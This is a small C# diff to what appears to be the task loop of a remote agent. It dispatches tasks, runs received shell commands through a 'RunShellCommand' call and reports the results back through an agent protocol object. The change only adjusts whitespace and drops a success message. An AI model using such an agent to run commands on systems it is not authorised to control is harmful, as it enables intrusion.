@@ -164,11 +164,10 @@ class Program
                         switch (task)
                         {
                             case TaskShellCommand taskShellCommand:
-                                {
+                                {                                    
                                     response = new ResponseShellCommand();
-
                                     ((ResponseShellCommand)response).RunShellCommand(taskShellCommand.Command ?? "");                                    
-
+                                                                       
                                     break;
                                 }
 
@@ -202,12 +201,8 @@ class Program
                                 }
                         }
 
-                        if (response != null)
-                        {
-                            agentProto.RegisterNewResponse(response, task.Id);
-
-                            UX.DisplaySuccess($"Task(`{task.Id}`) successfully processed.");
-                        }
+                        if (response != null)                        
+                            agentProto.RegisterNewResponse(response, task.Id);                                                  
                     }                                       
 
                     ///
